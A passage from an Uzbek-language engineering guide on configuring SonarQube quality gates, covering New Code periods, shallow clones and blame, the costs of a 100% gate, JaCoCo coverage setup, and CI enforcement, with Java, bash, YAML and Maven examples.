Blame bo'lmaganda Sonar yangi kodni ishonchli aniqlay olmaydi. Ba'zi holatlarda yangi kod bo'sh chiqadi va gate hamma narsani o'tkazib yuboradi, bu yolg'on yashil. Boshqa holatlarda hamma fayl yangi deb olinadi va gate asossiz qizil yonadi. Ikkisi ham yomon, lekin yolg'on yashil xavfliroq.

Tekshirish va tuzatish bosqichlari:

```bash
# 1. Klon to'liqmi: natija "true" bo'lsa tarix sayoz
git rev-parse --is-shallow-repository

# 2. Sayoz bo'lsa to'liq tarixni tortib olish
git fetch --unshallow --tags

# 3. Muammoli faylda blame ishlayaptimi
git blame -L 1,20 --date=short src/main/java/.../PaymentService.java

# 4. Formatlash commitini blame hisobidan chiqarish (git tomonidagi chora)
echo "a1b2c3d4e5f6 # butun repoga spotless qo'llangan commit" >> .git-blame-ignore-revs
git config blame.ignoreRevsFile .git-blame-ignore-revs

# 5. Tahlilni SCM ma'lumotini qayta o'qishga majburlash
./mvnw sonar:sonar -Dsonar.scm.forceReloadAll=true
```

Bitta halol ogohlantirish: `.git-blame-ignore-revs` git buyruqlari uchun ishlaydi, lekin Sonar bu faylni o'qiydimi yoki yo'qmi, bu versiyaga va SCM plaginiga bog'liq. Shuning uchun unga yagona himoya sifatida tayanmang. Asosiy himoya hali ham formatlashni alohida commitda saqlash va formatlashdan keyin New Code chegarasini bilib turib surish.

### 7.9 Yangi kodda 100% talab qilishning amaliy oqibatlari

100 foiz talabi birinchi qarashda halol tuyuladi. Amalda u bir nechta nojo'ya ta'sir keltiradi.

Birinchi oqibat: assertion'siz testlar. Dasturchi qatorni "bosib o'tish" uchun test yozadi, lekin natijani tekshirmaydi. Sonar bunga `java:S2699` (test assertion'ni o'z ichiga olishi kerak) bilan javob berishi mumkin, lekin bu qoida hamma holatni tutmaydi.

```java
// Yomon: coverage bor, qiymat yo'q. Hech narsa tekshirilmaydi.
@Test
void refundWorks() {
    processor.refund(settledPayment(), new BigDecimal("10.00"));
}

// Sonar o'tadigan va haqiqatan foydali variant:
@Test
void settleQilinmaganTolovQaytarilmaydi() {
    RefundResult result = processor.refund(notSettledPayment(), BigDecimal.TEN);

    assertThat(result.accepted()).isFalse();
    assertThat(result.reason()).isEqualTo("To'lov hali yakunlanmagan");
}
```

Ikkinchi oqibat: kichik PR'da denominator muammosi. Bitta qatorli bugfix PR'da yangi kod 2 qator bo'lsa va bittasi qoplanmagan bo'lsa, qoplanganlik 50 foiz chiqadi va gate yiqiladi. Mantiqan PR yaxshi, mexanik ravishda qizil.

Uchinchi oqibat: odamlar tizimni aylanib o'tishni o'rganadi. Issue'lar "won't fix" deb belgilanadi va coverage exclusions ro'yxati asossiz o'sadi.

Amaliy tavsiya: yangi kodda 80 foiz qoplanganlik va yuqori og'irlikdagi yangi issue'ning nol bo'lishi ko'p jamoa uchun to'g'ri muvozanat. Qolgani review'ning ishi. Review'da ko'rilishi kerak bo'lgan savol "qoplanganlik qancha" emas, balki "bu test buzilsa, qanday bug ushlanadi".

Kichik PR muammosini hal qilish uchun absolut shartni ishlatish mumkin: yangi kodda qoplanmagan qatorlar soni ma'lum chegaradan oshmasligi. Bu foizga qaraganda kichik diff'larda barqarorroq ishlaydi.

### 7.10 Eski kod reytingi va yangi kod reytingini bir vaqtda kuzatish

Gate faqat yangi kodni ushlasa, eski kod ko'rinmay qolish xavfi bor. Shuning uchun ikkita qatlam kerak: gate yangi kod ustida, kuzatuv esa ikkisi ustida.

Gate shartlari faqat `new_` metrikalari bilan yoziladi. Umumiy metrikalar esa oylik trend sifatida o'qiladi: umumiy qoplanganlik o'syaptimi, issue soni kamayayaptimi. Muhimi raqamning qiymati emas, balki yo'nalishi.

Trendni API orqali olish va uni hisobotga qo'yish oson:

```bash
# Umumiy va yangi kod metrikalarining tarixi: yo'nalishni ko'rish uchun
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/measures/search_history?component=warehouse-service\
&metrics=coverage,new_coverage,violations,new_violations,sqale_rating\
&from=2026-01-01" | jq '.measures[] | {metric, last: .history[-1]}'

# Gate holatini pipeline ichida tekshirish (PR uchun)
curl -s -u "$SONAR_TOKEN:" \
  "$SONAR_URL/api/qualitygates/project_status?projectKey=warehouse-service&pullRequest=482" \
  | jq '.projectStatus.status, .projectStatus.conditions[] | select(.status=="ERROR")'
```

Yana bir foydali amaliyot: "ratchet" yondashuvi. Umumiy qoplanganlik uchun gate sharti qo'yilmaydi, lekin CI da oddiy tekshiruv bo'ladi: umumiy qoplanganlik oldingi qiymatdan pastga tushmasligi kerak. Bu talab bajarilishi oson, chunki yangi kod yaxshi qoplangan bo'lsa umumiy raqam o'zidan o'sadi.

Reytinglar haqida bitta aniqlik: umumiy koddagi reliability yoki security reytingi eng og'ir bitta issue bilan belgilanadi. Shuning uchun 200 ming qatorli legacy loyihada umumiy reyting deyarli har doim pastki harf bo'ladi va u jamoaning joriy ishi haqida hech narsa aytmaydi. Yangi kod reytingi esa aytadi. Tabloda ikkisi yonma-yon turishi kerak, lekin qaror faqat yangi kod ustunidan chiqadi.

New Code sozlamasini o'zgartirganda jamoaga oldin xabar bering. Chegara surilishi bilan tabloda issue soni keskin o'zgaradi va sababini bilmagan odam buni buzilish deb o'ylaydi.

### 7.11 Amalda qo'llash

- [ ] Har bir loyiha uchun New Code chegarasini reliz ritmiga qarab tanlab, global standartga tayanishni to'xtating.
- [ ] CI checkout bosqichida `fetch-depth: 0` qo'ying va `git rev-parse --is-shallow-repository` natijasi `false` ekanini tekshiring.
- [ ] Quality gate'dan umumiy kod shartlarini olib tashlab, hammasini `new_` metrikalariga o'tkazing va eski shartlarni kuzatuv paneliga ko'chiring.
- [ ] Repoga formatlashni bir marta qo'llash kerak bo'lsa, buni alohida commitda bajarib, hash'ini `.git-blame-ignore-revs` ga yozing va jamoaga ogohlantirish yuboring.
- [ ] `sonar.exclusions` va `sonar.coverage.exclusions` ro'yxatini ko'rib chiqib, generatsiya qilingan kod va DTO'larni chiqarib tashlang.
- [ ] Yangi kod coverage sharti 100 foiz bo'lsa uni 80 foizga tushiring va ustiga "assertion yo'q test qabul qilinmaydi" degan review qoidasini kiriting.
- [ ] Kichik PR'lar uchun absolut shart (qoplanmagan qatorlar soni) qo'shib, foizli shart kelib chiqaradigan noto'g'ri qizil holatlarni kamaytiring.
- [ ] Oylik hisobotga `coverage`, `new_coverage`, `violations`, `new_violations` trendini `api/measures/search_history` orqali avtomatik yig'ib qo'ying.

## 8. 100% ga sozlangan gate: har bir shart nimani talab qiladi (A Gate Set to 100 Percent)

Jamoalar "gate ni 100% ga sozlaymiz" deganda ko'pincha bitta raqamni, ya'ni coverage ni nazarda tutadi. Amalda esa quality gate bir nechta mustaqil shartning mantiqiy VA birikmasi, va ularning har biri boshqa narsani o'lchaydi. Shuning uchun "100% gate" ni qondirish bitta ish emas, balki besh-olti xil ishning jamlanmasi. Bu bob har bir shartni alohida ochadi, ularning o'zaro ziddiyatini ko'rsatadi va qondirish tartibini aniq ketma-ketlikda beradi.

### 8.1 "100% gate" aslida nimani anglatadi: bu bitta raqam emas, bir nechta shart

Quality gate loyiha darajasida saqlanadigan shartlar to'plami. Analiz tugagach Sonar har bir shartni alohida tekshiradi va bittasi ham buzilsa gate `ERROR` holatiga o'tadi. Standart `Sonar way` gate yangi kodga qaraydi, butun loyihaga emas, va bu "clean as you code" yondashuvining asosi.

Jamoa "100%" deganda odatda quyidagi to'plamni tushunadi.

```yaml
# Jamoa shartnomasi: gate nimani talab qiladi (hujjat, konfiguratsiya emas)
gate:
  nomi: "Payments strict"
  yangi_kod_ta_rifi: "reference branch: main"
  shartlar:
    - olchov: "Coverage on New Code"      # qatorlar qoplanishi
      operator: "<"
      qiymat: 100
    - olchov: "Duplicated Lines on New Code (%)"
      operator: ">"
      qiymat: 0
    - olchov: "New Issues"                # barcha toifa, barcha severity
      operator: ">"
      qiymat: 0
    - olchov: "Security Hotspots Reviewed (%)"
      operator: "<"
      qiymat: 100
    - olchov: "Reliability Rating on New Code"
      operator: "worse than"
      qiymat: "A"
```

Muhim nuance: shart nomlari va mavjud o'lchovlar SonarQube versiyasiga qarab farq qiladi. 9.9 LTA liniyasida gate ko'proq reyting va severity atamalari bilan ishlaydi. 2025 LTA liniyasida esa severity o'rniga "yangi issue soni" va software quality (security, reliability, maintainability) o'lchovlari oldinga chiqdi. Shuning uchun gate ni qo'lda UI dan ko'chirmasdan, API orqali o'qib olib versiyaga mos nom bilan yozish ishonchliroq.

```bash
# Mavjud gate shartlarini o'qish: nomlarni to'qib chiqarmaslik uchun
curl -su "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/qualitygates/show?name=Sonar%20way" | jq '.conditions'

# Yangi gate yaratish va unga shart qo'shish
curl -su "$SONAR_TOKEN:" -X POST \
  "$SONAR_HOST/api/qualitygates/create" -d "name=Payments strict"

curl -su "$SONAR_TOKEN:" -X POST \
  "$SONAR_HOST/api/qualitygates/create_condition" \
  -d "gateName=Payments strict" \
  -d "metric=new_coverage" -d "op=LT" -d "error=100"

# Analizdan keyin natijani o'qish: CI shu javobga qarab to'xtaydi
curl -su "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/qualitygates/project_status?projectKey=payments&branch=main" \
  | jq -r '.projectStatus.status'
```

### 8.2 Shart: yangi kodda coverage 100 foiz, nimani talab qiladi va qanchaga tushadi

Coverage ni Sonar o'zi hisoblamaydi. Java da uni JaCoCo 0.8.x hisoblab XML hisobot yozadi, Sonar esa shu XML ni o'qiydi. Agar XML yo'lini ko'rsatmasang, coverage nol bo'lib ko'rinadi va gate darhol buziladi. Bu eng ko'p uchraydigan "nega 0% chiqdi" sababi.

Sonar `new_coverage` ni faqat yangi kod chizig'iga tushgan qoplanadigan qatorlar bo'yicha hisoblaydi. Formula sodda: qoplangan yangi qatorlar, bo'linadi, qoplanishi mumkin bo'lgan yangi qatorlarga. Maxraj "o'zgargan qatorlar" emas, "o'zgargan va o'lchanadigan qatorlar": `record` maydoni unga tushmaydi, `if` tarmog'i esa tushadi.

100 foiz talabi amalda uchta narsani majburlaydi. Birinchi, har bir yangi `if` va `catch` tarmog'i uchun test kerak. Ikkinchi, "qo'lda hech qachon ishlamaydi" deb yozilgan mudofaa kodi ham test talab qiladi. Uchinchi, generatsiya qilingan kodni hisobdan chiqarish kerak, aks holda Lombok yoki MapStruct chiqargan qatorlar sizni bo'g'adi.

```java
// Yomon: Sonar yangi kodda 3 ta qoplanmagan tarmoq ko'radi
public BigDecimal hisoblash(Buyurtma b) {
    if (b == null) throw new IllegalArgumentException("buyurtma yo'q");
    BigDecimal jami = b.qatorlar().stream()
            .map(q -> q.narx().multiply(BigDecimal.valueOf(q.soni())))
            .reduce(BigDecimal.ZERO, BigDecimal::add);
    if (jami.compareTo(BEPUL_CHEGARA) > 0) {
        return jami;                      // test yozilmagan tarmoq
    }
    return jami.add(YETKAZISH);           // test yozilmagan tarmoq
}
```

```java
// Sonar o'tadigan variant: tarmoqlar parametrlangan test bilan qoplanadi
@ParameterizedTest
@CsvSource({
        "100000, 100000",   // bepul chegaradan yuqori: yetkazish qo'shilmaydi
        "50000,  65000"     // chegaradan past: yetkazish qo'shiladi
})
void jami_summa_chegaraga_qarab_hisoblanadi(long narx, long kutilgan) {
    Buyurtma b = buyurtma(narx);
    assertThat(xizmat.hisoblash(b))
            .isEqualByComparingTo(BigDecimal.valueOf(kutilgan));
}

@Test
void null_buyurtma_rad_etiladi() {           // uchinchi tarmoq
    assertThatThrownBy(() -> xizmat.hisoblash(null))
            .isInstanceOf(IllegalArgumentException.class);
}
```

Konfiguratsiya tomoni ham shu darajada muhim. Quyidagi `properties` fayli 100 foiz talabini realistik qiladi: generatsiya va infratuzilma kodi o'lchovdan chiqadi, lekin biznes kodi chiqmaydi.

```properties
# JaCoCo XML ni Sonar ga ko'rsatish: bu yo'l bo'lmasa coverage 0 bo'ladi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Yangi kod ta'rifi: main bilan solishtirish
sonar.newCode.referenceBranch=main

# Coverage dan chiqariladigan fayllar: generatsiya va boshlang'ich sinf
sonar.coverage.exclusions=\
  **/*Application.java,\
  **/config/**,\
  **/dto/**Mapper*.java,\
  **/generated/**

# Testlarning o'zi coverage maxrajiga tushmasligi uchun
sonar.test.inclusions=**/*Test.java,**/*IT.java
```

Lombok ishlatilsa loyiha ildizida `lombok.config` ichida `lombok.addLombokGeneratedAnnotation = true` qatori bo'lishi shart. Shundan keyin JaCoCo `@Generated` belgisi bor metodlarni o'tkazib yuboradi. Bu bitta qator coverage ni bir necha foizga ko'taradi, test yozmasdan.

### 8.3 Shart: yangi kodda takrorlanish 0 foiz, qanday qondiriladi

Sonar takrorlanishni token ketma-ketligi bo'yicha topadi, matn bo'yicha emas. Java uchun chegara odatda kamida 10 ta ketma-ket bayonot atrofida, aniq qiymat tilga va versiyaga qarab farq qiladi. O'zgaruvchi nomini almashtirish takrorni yashirmaydi.

0 foiz talabi eng og'ir uriladigan joy integratsion testlar. Ikki `@SpringBootTest` sinfida bir xil `given` bloki bo'lsa, u darhol duplication bo'lib chiqadi. To'g'ri yechim testdan takrorni olib tashlash, ya'ni umumiy fixture ni `@TestConfiguration` yoki builder ga ko'chirish. Noto'g'ri yechim esa `sonar.cpd.exclusions` ga butun test papkasini yozib qo'yish, chunki shunda haqiqiy nusxa-ko'chirma ham ko'rinmay qoladi.

Produktsion kodda eng ko'p takrorlanadigan uchta joy: DTO dan entity ga o'girish, validatsiya bloklari, va `try/catch` bilan o'ralgan tashqi chaqiruvlar. Birinchisini mapper ga, ikkinchisini Bean Validation annotatsiyalariga, uchinchisini bitta `execute(Supplier<T>)` yordamchisiga yig'ish takrorlanishni ildizdan yo'qotadi.

### 8.4 Shart: yangi issue 0 ta, har bir toifa bo'yicha nima qilish kerak

"Yangi issue 0 ta" shartida severity bo'yicha yumshoqlik yo'q. Ya'ni bitta `MINOR` code smell ham gate ni buzadi. Bu shart jamoani ikki xil ishga majburlaydi: qoidani qondirish yoki qoidani ongli ravishda o'chirish.

Eng ko'p uchraydigan toifalar va ularni qondirish usuli quyidagicha. Cognitive complexity (`java:S3776`) metodni bo'lishni talab qiladi, chegara odatda 15 atrofida. Takroriy string literal (`java:S1192`) konstantaga chiqarishni so'raydi. Ko'p parametr (`java:S107`) parametr obyektini talab qiladi. Umumiy `Exception` tashlash (`java:S112`) domen xatosini talab qiladi. Yopilmagan resurs (`java:S2095`) `try-with-resources` ni talab qiladi. `TODO` izohi (`java:S1135`) olib tashlashni yoki issue tracker ga ko'chirishni so'raydi.

Bu yerda eng muhim qoida: issue ni kodda `@SuppressWarnings` bilan yashirish Sonar uchun ishlamaydi. Sonar o'z yo'lini beradi, ya'ni issue ni UI dan `Won't fix` yoki `False positive` deb belgilash, yoki qoidani quality profile dan olib tashlash, yoki `sonar.issue.ignore.multicriteria` bilan fayl naqshini chiqarish. Uchinchi yo'l kodda ko'rinmaydi, shuning uchun uni albatta sharh bilan hujjatlash kerak.

```properties
# Qoidani ongli chetlab o'tish: faqat aniq fayl naqshi uchun
# e1: migratsiya skriptlarida "magic number" qoidasi ma'nosiz
sonar.issue.ignore.multicriteria=e1,e2
sonar.issue.ignore.multicriteria.e1.ruleKey=java:S109
sonar.issue.ignore.multicriteria.e1.resourceKey=**/migration/**/*.java
# e2: testlarda tasdiqlash metodi nomi uzun bo'lishi atayin
sonar.issue.ignore.multicriteria.e2.ruleKey=java:S100
sonar.issue.ignore.multicriteria.e2.resourceKey=**/*Test.java
```

### 8.5 Shart: security hotspot 100 foiz ko'rib chiqilgan, jarayoni

Security hotspot issue emas. U "bu joy xavfli bo'lishi mumkin, odam qarab chiqsin" degan belgi. Shuning uchun uni kod o'zgartirish bilan "tuzatib" bo'lmaydi, uni faqat odam ko'rib chiqib holat qo'yishi kerak: `Safe`, `Fixed` yoki `To review`.

Jarayon amalda shunday ketadi. Pull request analizi hotspot chiqarsa, reviewer Sonar UI da o'sha hotspot ni ochadi, kontekstni o'qiydi va qaror yozadi. Qaror sababi bilan yoziladi, chunki keyingi auditda "kim nega safe dedi" savoli chiqadi. Agar hotspot haqiqatan xavf bo'lsa, kod tuzatiladi va holat `Fixed` ga o'tadi.

Eng ko'p chiqadigan hotspot turlari: shifrlash algoritmi tanlovi, tasodifiy son generatori, fayl yo'li bilan ishlash, HTTP mijozida sertifikat tekshiruvi, va SQL ni satr sifatida yig'ish. To'lov servisida oxirgisi ayniqsa muhim, chunki u SQL injection ga eshik ochadi.

```sql
-- Yomon: yo'l kodda satr sifatida yig'ilgan edi, hotspot va keyin issue
-- SELECT * FROM tolov WHERE holat = '" + holat + "'

-- Sonar o'tadigan variant: nomlangan parametr, plan ham keshlanadi
SELECT t.id, t.summa, t.valyuta, t.yaratilgan_vaqt
FROM tolov t
WHERE t.holat = :holat
  AND t.yaratilgan_vaqt >= :boshlanish
ORDER BY t.yaratilgan_vaqt DESC
LIMIT :chegara;

-- Hisobot uchun indeks: issue emas, lekin reyting va performance uchun kerak
CREATE INDEX IF NOT EXISTS idx_tolov_holat_vaqt
    ON tolov (holat, yaratilgan_vaqt DESC);
```

Bu so'rovni qoplash uchun haqiqiy baza kerak, mock emas. Testcontainers bilan qanday ishlash testlash qo'llanmasidagi Testcontainers mavzusida batafsil yozilgan, shuning uchun bu yerda takrorlanmaydi.

### 8.6 Shart: reytinglar A darajada, nima buzadi

Reyting mutlaq son emas, nisbat. Maintainability reytingi technical debt ratio ga qarab chiqadi, ya'ni tuzatish uchun kerakli vaqtning kodni yozish uchun ketgan taxminiy vaqtga nisbatiga. Shuning uchun kichik o'zgarishda bitta jiddiy smell ham reytingni pastga tushirishi mumkin, chunki maxraj kichik.

Reliability va security reytinglari boshqacha ishlaydi. Ular eng og'ir issue bo'yicha aniqlanadi, o'rtacha bo'yicha emas. Ya'ni yangi kodda bitta blocker bug bo'lsa, qolgan hammasi toza bo'lsa ham reliability A bo'lmaydi. Bu qoida yangi versiyalarda software quality atamalari bilan qayta nomlangan, lekin mantiq o'zgarmagan.

| Tuzoq | Nega yuzaga keladi | Yechim |
| --- | --- | --- |
| Coverage 0% ko'rinadi | JaCoCo XML yo'li berilmagan yoki hisobot analizdan keyin yoziladi | `verify` dan keyin `sonar:sonar` ni ishlatish, `xmlReportPaths` ni tekshirish |
| Lombok kodi coverage ni pasaytiradi | `@Generated` belgisi yo'q | `lombok.config` ga `addLombokGeneratedAnnotation = true` |
| Integratsion testlar duplication beradi | `given` bloklari nusxa qilingan | Umumiy fixture va builder, `cpd.exclusions` emas |
| Reyting kichik PR da tushadi | Technical debt ratio maxraji kichik | PR ni mayda bo'lmasdan bitta mantiqiy birlik qilish |
| Hotspot gate ni ushlab turadi | Hech kim ko'rib chiqmagan | Review ni PR checklist ga kiritish, sababni yozish |
| Gate "yashil" lekin kod yomon | Faqat yangi kod o'lchanadi | Legacy uchun alohida reja, "debt budget" |
| Issue yashirilgan lekin hujjatlanmagan | `multicriteria` kodda ko'rinmaydi | Har bir chetlab o'tishga sharh va sabab |
| Branch analizi yo'q | Faqat `main` skanerlanadi | PR decoration va `sonar.pullrequest.*` parametrlari |

### 8.7 Shartlar birga qo'yilganda yuzaga keladigan qarama-qarshiliklar

Birinchi ziddiyat: coverage 100 foiz va issue 0 ta bir-biriga qarshi ishlaydi. Qoplanmagan tarmoqni yopish uchun test yozasan, test kodida esa Sonar o'z qoidalarini qo'llaydi. Natijada test yozish yangi issue keltiradi, uni tuzatish yana vaqt oladi. Yechim: test kodi uchun alohida quality profile, lekin bu profil bo'sh bo'lmasin, chunki test kodi ham kod.

Ikkinchi ziddiyat: duplication 0 foiz va coverage 100 foiz. Takrorni yo'qotish uchun abstraksiya chiqarasan, abstraksiya esa yangi tarmoqlar keltiradi, ular yana test talab qiladi. Ba'zan ozgina takror abstraksiyadan arzonroq, lekin 0 foiz shart bunga yo'l bermaydi.

Uchinchi ziddiyat: mudofaa kodi va coverage. "Bu hech qachon bo'lmaydi" deb yozilgan `else` bloki testda qo'zg'atilishi qiyin. Jamoa ikki yo'ldan birini tanlashga majbur: mudofaa kodini olib tashlash yoki uni sun'iy test bilan qoplash. Birinchisi odatda to'g'riroq, chunki o'lmas kod texnik qarz.

To'rtinchi ziddiyat: reyting A va amaliy muddat. Reytingni ko'tarish uchun refaktoring kerak, refaktoring esa diff ni kattalashtiradi, katta diff esa yana ko'proq yangi kod va ko'proq coverage talabi degani. Bu halqadan chiqish uchun refaktoringni alohida PR qilish kerak, funksional o'zgarishdan ajratib.

### 8.8 Gate ni qondirish uchun kerakli ish tartibi: aniq ketma-ketlik

Tartib muhim: avval test yozib keyin metodni bo'lsa, testlar ham qayta yoziladi.

To'g'ri ketma-ketlik quyidagicha. Avval lokal analiz ishlatib ro'yxatni ko'rish. Keyin issue larni tuzatish, chunki ular strukturani o'zgartiradi. Keyin takrorni yo'qotish, chunki u ham strukturani o'zgartiradi. Keyin coverage uchun test yozish, chunki struktura endi qotgan. Keyin hotspot larni ko'rib chiqish. Oxirida gate ni CI da tekshirish.

```bash
# 1-qadam: lokal analiz, PR ochilmasdan ro'yxatni ko'rish
./mvnw clean verify sonar:sonar \
  -Dsonar.host.url="$SONAR_HOST" -Dsonar.token="$SONAR_TOKEN" \
  -Dsonar.projectKey=payments \
  -Dsonar.newCode.referenceBranch=main

# 2-qadam: faqat yangi kod bo'yicha issue larni matnda olish
curl -su "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/issues/search?componentKeys=payments&inNewCodePeriod=true&ps=200" \
  | jq -r '.issues[] | "\(.rule)\t\(.component):\(.line)\t\(.message)"'

# 3-qadam: coverage da qoplanmagan yangi qatorlarni ko'rish
curl -su "$SONAR_TOKEN:" \
  "$SONAR_HOST/api/measures/component_tree?component=payments&metricKeys=new_uncovered_lines&ps=100" \
  | jq -r '.components[] | select(.measures[0].period.value != "0") | .path'

# 4-qadam: gate ni CI da majburlash, analiz tugashini kutib
./mvnw sonar:sonar -Dsonar.qualitygate.wait=true -Dsonar.qualitygate.timeout=600
```

CI tomonida gate ni "ogohlantirish" emas, "to'xtatish" qilib qo'yish kerak. Aks holda shart bor, lekin kuchi yo'q.

```yaml
name: ci
on:
  pull_request:
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0        # blame va yangi kod uchun to'liq tarix kerak
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: temurin
          cache: maven
      # Testlar va JaCoCo hisoboti analizdan OLDIN bo'lishi shart
      - run: ./mvnw -B clean verify
      - run: >-
          ./mvnw -B sonar:sonar
          -Dsonar.qualitygate.wait=true
          -Dsonar.pullrequest.key=${{ github.event.number }}
          -Dsonar.pullrequest.branch=${{ github.head_ref }}
          -Dsonar.pullrequest.base=${{ github.base_ref }}
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

Maven tomonida JaCoCo ni to'g'ri ulash shartning yarmi. Quyidagi blok ikkita majburiy bosqichni ko'rsatadi.

```xml
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <!-- agent testdan oldin ulanadi -->
      <id>prepare-agent</id>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <!-- XML hisobot verify fazasida yoziladi -->
      <id>report</id>
      <phase>verify</phase>
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

### 8.9 foiz gate ning haqiqiy narxi: vaqt, jamoa charchog'i, chetlab o'tish xavfi

Narx uchta shaklda keladi. Birinchisi vaqt. Tajribaga ko'ra 80 foizdan 100 foizga ko'tarilish oldingi 80 foizni yozishdan ko'p vaqt oladi, chunki qolgan tarmoqlar eng qiyin qo'zg'atiladiganlari.

Ikkinchisi jamoa charchog'i. Agar gate PR ni bitta `MINOR` smell uchun to'xtatsa, developer gate ni dushman deb ko'radi. Shundan keyin boshlanadigan narsa eng xavfli: chetlab o'tish madaniyati. Odamlar `Won't fix` ni o'ylamasdan bosadi, exclusion ro'yxatini kengaytiradi, yoki testni shunchaki `assertThat(true).isTrue()` bilan yozadi.

Uchinchisi soxta xotirjamlik. 100 foiz coverage sifat kafolati emas va bu jiddiy ayt ishi. Coverage faqat "shu qator ishga tushdi" deyadi, "natija to'g'ri" demaydi. Tasdiqsiz test 100 foiz beradi va hech narsani ushlamaydi.

```java
// 100% coverage beradi, lekin hech narsani tekshirmaydi
@Test
void qoldiq_kamayadi() {
    ombor.yechish("SKU-1", 5);     // tasdiq yo'q, natija ko'rilmaydi
}

// Shu qatorlar, lekin haqiqiy tekshiruv bilan
@Test
void qoldiq_aniq_miqdorda_kamayadi() {
    ombor.kirim("SKU-1", 10);
    ombor.yechish("SKU-1", 5);
    assertThat(ombor.qoldiq("SKU-1")).isEqualTo(5);
    assertThatThrownBy(() -> ombor.yechish("SKU-1", 99))
            .isInstanceOf(QoldiqYetmaydi.class);
}
```

Shu sababli 100 foiz coverage shartini mutation testing yoki hech bo'lmasa "har bir testda kamida bitta tasdiq" qoidasi bilan kuchaytirish kerak. Aks holda raqam bor, himoya yo'q.

### 8.10 Qachon 100 foiz o'rinli, qachon 80-90 aqlliroq qaror

100 foiz o'rinli bo'ladigan holatlar aniq va tor. Pul harakati bilan ishlaydigan modul, hisob-kitob yadrosi, huquqiy talab bor domen, yoki tashqi mijozlar ishlatadigan kutubxona. Bu joylarda xato narxi test yozish narxidan ancha yuqori, va kod hajmi odatda kichik.

80 dan 90 foizgacha oraliq aqlliroq bo'ladigan holatlar ko'proq. Tez o'zgaradigan UI qatlami, integratsiya adapterlari, hisobot generatorlari, va prototip bosqichidagi modullar. Bu yerda yuqori coverage ni ushlab turish narxi uning foydasidan oshib ketadi.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Gate qo'yish | Bitta global gate butun tashkilotga | Modul risk darajasi bo'yicha bir nechta gate |
| Coverage raqami | "100% qilaylik" deb bir yo'la joriy qilish | Yadro uchun 100, adapter uchun 80, reja bilan |
| Exclusion | Gate buzilganda shoshib qo'shiladi | Oldindan hujjatlangan ro'yxat, review bilan |
| Yangi kod ta'rifi | Standart holatda qoldiriladi | `referenceBranch` yoki release siklga moslanadi |
| Issue tuzatish | Gate buzilgandan keyin boshlanadi | IDE da SonarLint bilan push dan oldin |
| Takrorlanish | `cpd.exclusions` bilan yashiriladi | Abstraksiya chiqarilib ildizdan olinadi |
| Hotspot | PR oxirida shoshib yopiladi | Review checklist bandi, sabab yoziladi |
| Legacy kod | "keyin tuzatamiz" deb qoldiriladi | Debt budget, har sprintda o'lchangan ulush |
| Gate buzilishi | CI da ogohlantirish bo'lib qoladi | Merge ni bloklaydi, chetlab o'tish log qilinadi |
| Metrika maqsadi | Raqamni ko'tarish | Nuqson oqimini kamaytirish, raqam vosita |

### 8.11 Gate ni bosqichma-bosqich qattiqlashtirish rejasi

Birdan 100 foizga o'tish deyarli har doim chetlab o'tish bilan tugaydi. Shuning uchun gate to'rt bosqichda qattiqlashtiriladi, har bosqich kamida ikki sprint turadi.

Birinchi bosqich: yangi kod ta'rifini to'g'rilash va gate ni faqat kuzatuv rejimida ishlatish. Hech narsa bloklanmaydi, lekin har PR da raqam ko'rinadi.

Ikkinchi bosqich: yangi kodda blocker va critical darajadagi issue larni bloklash, coverage chegarasini 60 ga qo'yish. Shu bosqichda SonarLint ni IDE ga majburiy qilish kerak, aks holda feedback juda kech keladi.

Uchinchi bosqich: coverage ni 80 ga, duplication ni 3 foizga, hotspot review ni 100 foizga ko'tarish. Bu aslida standart `Sonar way` darajasi va aksariyat jamoa uchun oqilona nuqta.

To'rtinchi bosqich: faqat yadro modullarda coverage 100 va issue 0. Bu bosqich butun monorepoga emas, nomlangan modullarga qo'llanadi. Shu paytda gate ro'yxati, exclusion ro'yxati va chetlab o'tish jurnali bitta hujjatda bo'lishi kerak, aks holda uch oydan keyin hech kim nega shunday qilinganini eslay olmaydi.

### 8.12 Amalda qo'llash

- [ ] `api/qualitygates/show` dan mavjud shart nomlarini o'qib, o'z versiyangizdagi aniq metrika kalitlarini yozib qo'ying.
- [ ] `sonar.coverage.jacoco.xmlReportPaths` va `verify` dan keyin `sonar:sonar` tartibini tekshirib, coverage 0 bo'lmasligiga ishonch hosil qiling.
- [ ] Loyiha ildiziga `lombok.config` qo'shib `lombok.addLombokGeneratedAnnotation = true` yozing va coverage o'zgarishini o'lchang.
- [ ] Yangi kod ta'rifini `referenceBranch=main` ga o'tkazib, PR analizini `sonar.pullrequest.*` parametrlari bilan ulang.
- [ ] CI da `sonar.qualitygate.wait=true` qo'yib, gate buzilishi merge ni to'xtatishini tasdiqlang.
- [ ] Har bir exclusion va `Won't fix` qaroriga sabab yozadigan jurnal fayli yuritishni boshlang.
- [ ] Qaysi modulda 100 foiz, qaysi modulda 80 foiz talab qilinishini risk bo'yicha ajratib, ikkita alohida gate yarating.
- [ ] Bitta yadro modulda mutation testing ishlatib, 100 foiz coverage haqiqatan xatoni ushlayotganini tekshirib ko'ring.


# III. Qamrov (coverage)

## 9. Coverage qanday o'lchanadi: JaCoCo mexanikasi (How Coverage Is Measured)

SonarQube coverage raqamini o'zi hisoblamaydi. U faqat tashqi vositadan kelgan hisobotni o'qiydi, Java dunyosida bu deyarli har doim JaCoCo. Shuning uchun "coverage 68% chiqdi" degan savolning javobi Sonar da emas, JaCoCo ning bytecode bilan ishlash mexanikasida yotadi. Bu bobda probe qanday qo'yiladi, `jacoco.exec` ichida nima bor, qaysi ko'rsatkich Sonar ga boradi va nega ba'zi qator yashil bo'lsa ham branch sariq qolishini ko'rib chiqamiz.

